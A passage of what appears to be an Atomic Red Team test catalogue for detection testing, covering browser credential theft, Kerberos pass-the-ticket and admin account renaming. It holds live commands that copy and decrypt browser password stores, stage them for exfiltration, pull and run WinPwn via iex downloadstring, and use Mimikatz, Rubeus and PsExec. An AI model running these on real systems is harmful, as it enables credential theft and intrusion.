",powershell,"dependencies.0.description: Chrome must be installed

dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
$installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi""
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath ""chrome.exe""
Stop-Process -Name ""chrome""

",
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Simulating access to Opera Login Data,28498c17-57e4-495a-b0be-cc1e36de408b,"Simulates an adversary accessing encrypted credentials from Opera web browser's login database. 
",windows,,,"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""
",powershell,,,"Remove-Item -Path ""PathToAtomicsFolder\..\ExternalPayloads\Login Data"" -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: Opera must be installed

dependencies.0.prereq_command: if (((Test-Path ""$env:LOCALAPPDATA\Programs\Opera\launcher.exe"") -Or (Test-Path ""C:\Program Files\Opera\launcher.exe"") -Or (Test-Path ""C:\Program Files (x86)\Opera\launcher.exe""))) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
$installer = ""PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe""
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
Start-Sleep -s 180
Stop-Process -Name ""opera""

dependencies.1.description: Opera login data file must exist

dependencies.1.prereq_command: if (Test-Path ""$env:APPDATA\Opera Software\Opera Stable\Login Data"") {exit 0} else {exit 1}
dependencies.1.get_prereq_command: New-Item -Path ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -ItemType File

",
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Simulating access to Windows Firefox Login Data,eb8da98a-2e16-4551-b3dd-83de49baa14c,"Simulates an adversary accessing encrypted credentials from firefox web browser's login database.
more info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data
",windows,,,"Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" -Force -Recurse
",powershell,,,"Remove-Item -Path ""PathToAtomicsFolder\..\ExternalPayloads\Profiles"" -Force -ErrorAction Ignore -Recurse
",powershell,"dependencies.0.description: Firefox must be installed

dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Mozilla Firefox\firefox.exe"") -Or (Test-Path ""C:\Program Files (x86)\Mozilla Firefox\firefox.exe"")) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=""https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US""}else {$url=""https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US""}
$installer = ""PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe""
(New-Object Net.WebClient).DownloadFile($url,$installer)
Start-Process $installer -ArgumentList '/S' -Wait

dependencies.1.description: Firefox login data file must exist

dependencies.1.prereq_command: if (Test-Path ""$env:APPDATA\Mozilla\Firefox\Profiles\"") {exit 0} else {exit 1}
dependencies.1.get_prereq_command: if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=""C:\Program Files\Mozilla Firefox\firefox.exe""}else {$firefox=""C:\Program Files (x86)\Mozilla Firefox\firefox.exe""}
Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
Start-Process $firefox -NoNewWindow
Start-Sleep -s 20
Stop-Process -Name firefox

",
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Simulating access to Windows Edge Login Data,a6a5ec26-a2d1-4109-9d35-58b867689329,"Simulates an adversary accessing encrypted credentials from Edge web browser's login database.
more info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/
",windows,,,"Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads\Edge"" -Force -Recurse
",powershell,,,"Remove-Item -Path ""PathToAtomicsFolder\..\ExternalPayloads\Edge"" -Force -ErrorAction Ignore -Recurse
",powershell,"dependencies.0.description: Edge must be installed

dependencies.0.prereq_command: if (Test-Path ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"") {exit 0} else {exit 1}
dependencies.0.get_prereq_command: ""Installation is not implemented as Edge is a part of windows""

dependencies.1.description: Edge login data file must exist

dependencies.1.prereq_command: if (Test-Path ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"") {exit 0} else {exit 1}
dependencies.1.get_prereq_command: $edge=""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
Start-Process $edge 
Start-Sleep -s 20
Stop-Process -Name msedge

",
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Decrypt Mozilla Passwords with Firepwd.py,dc9cd677-c70f-4df5-bd1c-f114af3c2381,"Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.
Upon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. 
",windows,,,"$PasswordDBLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
cmd /c #{Firepwd_Path} -d $PasswordDBLocation > #{Out_Filepath}
cat #{Out_Filepath}
",powershell,,,"Remove-Item -Path ""#{Out_Filepath}"" -erroraction silentlycontinue   
",powershell,"dependencies.0.description: Firepwd must exist at #{Firepwd_Path}

dependencies.0.prereq_command: if (Test-Path ""#{Firepwd_Path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py"" -outfile ""#{Firepwd_Path}""

dependencies.1.description: Firefox profile directory must be present

dependencies.1.prereq_command: if (get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"" -erroraction silentlycontinue) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi""
msiexec.exe /i ""PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"" /quiet
sleep -s 30
start-process ""$env:programfiles\Mozilla Firefox\firefox.exe"".
sleep -s 5
stop-process -name ""firefox""

dependencies.2.description: Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}

dependencies.2.prereq_command: if (Test-Path ""#{VS_CMD_Path}"") {exit 0} else {exit 1}

dependencies.2.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://aka.ms/vs/17/release/vs_BuildTools.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe""
write-host ""Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\..\ExternalPayloads\VS_BuildTools.exe.""

dependencies.3.description: Python must be installed

dependencies.3.prereq_command: if (Test-Path ""#{Python_Path}"") {exit 0} else {exit 1}

dependencies.3.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait

dependencies.4.description: Pip must be installed.

dependencies.4.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
if (pip -v) {exit 0} else {exit 1}

dependencies.4.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://bootstrap.pypa.io/ez_setup.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""      
invoke-webrequest ""https://bootstrap.pypa.io/get-pip.py"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""
cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\ez_setup.py""
cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\get-pip.py""

dependencies.5.description: Pycryptodome library must be installed 

dependencies.5.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
if (pip show pycryptodome) {exit 0} else {exit 1}

dependencies.5.get_prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
if (test-path ""#{VS_CMD_Path}""){pip install pycryptodome | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq""}

dependencies.6.description: Pyasn1 library must be installed 

dependencies.6.prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
if (pip show pyasn1) {exit 0} else {exit 1}

dependencies.6.get_prereq_command: $env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(""Path"",""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"",""User""))
if (test-path ""#{VS_CMD_Path}""){pip install pyasn1 | out-null | cmd /c %comspec% /k ""#{VS_CMD_Path}"" | out-null} else {write-host ""Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.""}

","input_arguments.Firepwd_Path.description: Filepath for Firepwd.py

input_arguments.Firepwd_Path.type: string

input_arguments.Firepwd_Path.default: PathToAtomicsFolder\..\ExternalPayloads\Firepwd.py

input_arguments.Out_Filepath.description: Filepath to output results to

input_arguments.Out_Filepath.type: string

input_arguments.Out_Filepath.default: $env:temp\T1555.003Test8.txt

input_arguments.VS_CMD_Path.description: Filepath to Visual Studio Build Tools Command prompt

input_arguments.VS_CMD_Path.type: string

input_arguments.VS_CMD_Path.default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat

input_arguments.Python_Path.description: Filepath to python

input_arguments.Python_Path.type: string

input_arguments.Python_Path.default: C:\Program Files\Python310\python.exe

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,LaZagne.py - Dump Credentials from Firefox Browser,87e88698-621b-4c45-8a89-4eaebdeaabb1,"Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",linux,,,python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file},sh,True,,rm -R /tmp/LaZagne; rm -f #{output_file},sh,"dependencies.0.description: Get Lazagne from Github and install requirements
dependencies.0.prereq_command: test -f #{lazagne_path}/laZagne.py
dependencies.0.get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
dependencies.1.description: Needs git, python3 and some pip stuff
dependencies.1.prereq_command: which git && which python3 && which pip
dependencies.1.get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
","input_arguments.lazagne_path.description: Path you put LaZagne Github with LaZagne.py

input_arguments.lazagne_path.type: string

input_arguments.lazagne_path.default: /tmp/LaZagne/Linux

input_arguments.specific_module.description: You may change the module to ""all"" for all password that can be found by LaZagne.py

input_arguments.specific_module.type: string

input_arguments.specific_module.default: browsers -firefox

input_arguments.output_file.description: This is where output for the Firefox passwords goes

input_arguments.output_file.type: string

input_arguments.output_file.default: /tmp/firefox_password.txt

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Stage Popular Credential Files for Exfiltration,f543635c-1705-42c3-b180-efd6dc6e7ee7,"This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,
simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). 
",windows,,,"$exfil_folder = ""$env:temp\T1555.003""
if (test-path ""$exfil_folder"") {} else {new-item -path ""$env:temp"" -Name ""T1555.003"" -ItemType ""directory"" -force}
$FirefoxCredsLocation = get-childitem -path ""$env:appdata\Mozilla\Firefox\Profiles\*.default-release\""
if (test-path ""$FirefoxCredsLocation\key4.db"") {copy-item ""$FirefoxCredsLocation\key4.db"" -destination ""$exfil_folder\T1555.003Firefox_key4.db""} else {}
if (test-path ""$FirefoxCredsLocation\logins.json"") {copy-item ""$FirefoxCredsLocation\logins.json"" -destination ""$exfil_folder\T1555.003Firefox_logins.json""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -destination ""$exfil_folder\T1555.003Chrome_Login Data""} else {}
if (test-path ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"") {copy-item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account"" -destination ""$exfil_folder\T1555.003Chrome_Login Data For Account""} else {}
if (test-path ""$env:appdata\Opera Software\Opera Stable\Login Data"") {copy-item ""$env:appdata\Opera Software\Opera Stable\Login Data"" -destination ""$exfil_folder\T1555.003Opera_Login Data""} else {}
if (test-path ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"") {copy-item ""$env:localappdata/Microsoft/Edge/User Data/Default/Login Data"" -destination ""$exfil_folder\T1555.003Edge_Login Data""} else {} 
compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" -force
",powershell,,,"Remove-Item -Path ""$env:temp\T1555.003.zip"" -force -erroraction silentlycontinue   
Remove-Item -Path ""$env:temp\T1555.003\"" -force -recurse -erroraction silentlycontinue
",,,
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - BrowserPwn,764ea176-fb71-494c-90ea-72e9d85dce76,Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
browserpwn -consoleoutput -noninteractive",powershell,,,rm .\System.Data.SQLite.dll -ErrorAction Ignore,,,
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - Loot local Credentials - mimi-kittenz,ec1d0b37-f659-4186-869f-31a554891611,Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive",powershell,,,,,,
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,e5e3d639-6ea8-4408-9ecd-d5a286268ca0,PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
Invoke-Sharpweb -command ""all""",powershell,,,,,,
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Simulating Access to Chrome Login Data - MacOS,124e13e5-d8a1-4378-a6ee-a53cd0c7e369,"This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. 
Once the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. 
See https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . 
",macos,,,"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""
cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""
",sh,,,"rm ""/tmp/T1555.003_Login Data"" >/dev/null 2>&1
rm ""/tmp/T1555.003_Login Data For Account"" >/dev/null 2>&1
",,,
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WebBrowserPassView - Credentials from Browser,e359627f-2d90-4320-ba5e-b0f878155bbe,The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.,windows,,,"Start-Process ""#{webbrowserpassview_path}""
Start-Sleep -Second 4
Stop-Process -Name ""WebBrowserPassView""
",powershell,True,,,powershell,"dependencies.0.description: Check if WebBrowserPassView.exe exists in the specified path #{webbrowserpassview_path}

dependencies.0.prereq_command: if (Test-Path ""#{webbrowserpassview_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1555.003\bin\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile ""#{webbrowserpassview_path}""

","input_arguments.webbrowserpassview_path.description: Path to the WebBrowserPassView executable 

input_arguments.webbrowserpassview_path.type: string

input_arguments.webbrowserpassview_path.default: PathToAtomicsFolder\T1555.003\bin\WebBrowserPassView.exe

"
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,BrowserStealer (Chrome / Firefox / Microsoft Edge),6f2c5c87-a4d5-4898-9bd1-47a55ecaf1dd,"[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.
If using to test with Firefox, if the browser is x64 you need to use the x64 build
",windows,,,"Copy-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads"" > $null
Remove-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
Copy-Item ""$env:PathToAtomicsFolder\T1555.003\src\Login Data"" -Destination ""$env:localappdata\Google\Chrome\User Data\Default\"" > $null
cd ""$env:PathToAtomicsFolder\T1555.003\bin""
.\BrowserCollector.exe
",powershell,,,"Remove-Item ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads"" -Destination ""$env:localappdata\Google\Chrome\User Data\Default\Login Data"" > $null
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\Login Data"" > $null
",powershell,"dependencies.0.description: Google Chrome must be on the device.

dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
$installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi""
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath ""chrome.exe""
Stop-Process -Name ""chrome""

dependencies.1.description: BrowserCollector must exist in the bin directory

dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1555.003\bin\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe"" -Outfile: ""PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe""
dependencies.2.description: Login Data file that is a copy of a chrome Login Data that contains credentials for the tool to ""steal."" Must exist at the specified path.

dependencies.2.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1555.003\src\Login Data"") {exit 0} else {exit 1}
dependencies.2.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/Login%20Data?raw=true"" -Outfile: ""PathToAtomicsFolder\T1555.003\src\Login Data""
",
T1555.003,Credentials from Password Stores: Credentials from Web Browsers,Dump Chrome Login Data with esentutl,70422253-8198-4019-b617-6be401b49fce,"This test simulates an adversary using esentutl to dump encrypted credentials from Google Chrome's Login database.
[Reference](https://actzero.ai/resources/blog/hygiene-tip-shut-down-attackers-harvesting-cached-browser-credentials/)
",windows,,,"esentutl.exe /y ""%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"" /d ""#{output_path}""
",command_prompt,,,"del /f /q #{output_path} > nul 2>&1
",powershell,"dependencies.0.description: Chrome must be installed

dependencies.0.prereq_command: if ((Test-Path ""C:\Program Files\Google\Chrome\Application\chrome.exe"") -Or (Test-Path ""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"")) {exit 0} else {exit 1}
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
$installer = ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi""
Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
msiexec /i $installer /qn
Start-Process -FilePath ""chrome.exe""
Stop-Process -Name ""chrome""

","input_arguments.output_path.description: File path for login data dump

input_arguments.output_path.type: string

input_arguments.output_path.default: %temp%\T1555.003_Login_Data.tmp

"
T1550.003,Use Alternate Authentication Material: Pass the Ticket,Mimikatz Kerberos Ticket Attack,dbf38128-7ba7-4776-bedf-cc2eed432098,"Similar to PTH, but attacking Kerberos
",windows,,,"""#{mimikatz_exe}"" ""kerberos::ptt #{ticket}""
",command_prompt,,,,powershell,"dependencies.0.description: Mimikatz must exist on disk at specified location (#{mimikatz_exe})

dependencies.0.prereq_command: if (Test-Path ""#{mimikatz_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$basePath = Split-Path ""#{mimikatz_exe}"" | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

","input_arguments.ticket.description: Ticket file name usually format of 'id-username\@domain.kirbi' (e.g. can be dumped by ""sekurlsa::tickets /export"" module)

input_arguments.ticket.type: string

input_arguments.ticket.default: None

input_arguments.mimikatz_exe.description: Path of the Mimikatz binary

input_arguments.mimikatz_exe.type: path

input_arguments.mimikatz_exe.default: PathToAtomicsFolder\..\ExternalPayloads\bin\x64\mimikatz.exe

"
T1550.003,Use Alternate Authentication Material: Pass the Ticket,Rubeus Kerberos Pass The Ticket,a2fc4ec5-12c6-4fb4-b661-961f23f359cb,"Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
PsExec is used to execute commands on the remote system, and the ""C$"" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
",windows,,,"& ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula \\#{target} -w c:\ -c ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
Set-Location ""PathToAtomicsFolder\..\ExternalPayloads""
Move-Item -Force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi
Write-Host ""Successfully retrieved TGT from '#{target}', now requesting a TGS from local""
& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi""
& ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"" purge      ",powershell,True,,,powershell,"dependencies.0.description: Rubeus must exist on disk at ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe""

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-Webrequest -Uri #{rubeus_url} -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe""

dependencies.1.description: PsExec must exist on disk at ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe""

dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PsTools"" -Force
New-Item -ItemType Directory (Split-Path ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"" ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -Force

","input_arguments.target.description: Remote system to request the TGT from

input_arguments.target.type: string

input_arguments.target.default: localhost

input_arguments.user_name.description: username associated with the ticket (privileged account not required)

input_arguments.user_name.type: string

input_arguments.user_name.default: Administrator

input_arguments.password.description: password for user_name

input_arguments.password.type: string

input_arguments.password.default: Password

input_arguments.domain.description: domain

input_arguments.domain.type: string

input_arguments.domain.default: $Env:USERDOMAIN

input_arguments.rubeus_url.description: URL of Rubeus executable

input_arguments.rubeus_url.type: url

input_arguments.rubeus_url.default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

"
T1098,Account Manipulation,Admin Account Manipulate,5598f7cb-cf43-455e-883a-f6008c5d46af,"Manipulate Admin Account Name
",windows,,,"$x = Get-Random -Minimum 2 -Maximum 9999
$y = Get-Random -Minimum 2 -Maximum 9999
$z = Get-Random -Minimum 2 -Maximum 9999
$w = Get-Random -Minimum 2 -Maximum 9999
Write-Host HaHa_$x$y$z

$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name

foreach($member in $fmm) {
    if($member -like ""*Administrator*"") {
        $account = $member.Name.Split(""\"")[-1] # strip computername\
        $originalDescription = (Get-LocalUser -Name $account).Description
        Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description
        Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation
        Write-Host ""Successfully Renamed $account Account on "" $Env:COMPUTERNAME
        }
    }
",powershell,True,,"$list = Get-LocalUser |?{$_.Description -like ""atr:*""}
foreach($u in $list) {
  $u.Description -match ""atr:(?<Name>[^;]+);(?<Description>.*)""
  Set-LocalUser -Name $u.Name -Description $Matches.Description
  Rename-LocalUser -Name $u.Name -NewName $Matches.Name
  Write-Host ""Successfully Reverted Account $($u.Name) to $($Matches.Name) on "" $Env:COMPUTERNAME
}
",,,
